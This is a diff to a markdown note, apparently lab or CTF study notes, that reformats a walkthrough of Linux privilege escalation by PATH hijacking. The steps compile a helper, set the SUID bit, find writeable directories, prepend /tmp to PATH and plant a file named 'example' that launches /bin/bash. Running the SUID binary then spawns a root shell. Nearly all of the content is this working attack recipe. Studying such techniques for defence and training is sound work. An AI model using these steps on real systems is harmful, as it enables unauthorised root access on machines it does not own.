@@ -1,4 +1,6 @@
-# Example:
+# PATH
+
+## Example:
 
 ### echo $PATH
 
@@ -16,18 +18,32 @@
 
 ## Compilation: 
 
-### gcc path_exp.c -o path -w
+    gcc path_exp.c -o path -w
 
-### chmod u+s path
+### Give SUID bit 
 
-### find / -writeable 2>/dev/null
+    chmod u+s path
 
-### export PATH=/tmp:$PATH (Add tmp to PATH)
+### Find writeable directories
 
-### cd /tmp
+    find / -writeable 2>/dev/null
 
-### echo "/bin/bash" > example
+### Add /tmp to PATH
 
-### chmod 777 example
+    export PATH=/tmp:$PATH 
 
-### ./path
+### Go to /tmp directory
+
+    cd /tmp
+
+### Insert bash binary execution command in our example file
+
+    echo "/bin/bash" > example
+
+### Give execute permissions
+
+    chmod 777 example
+
+### Run file
+
+    ./path
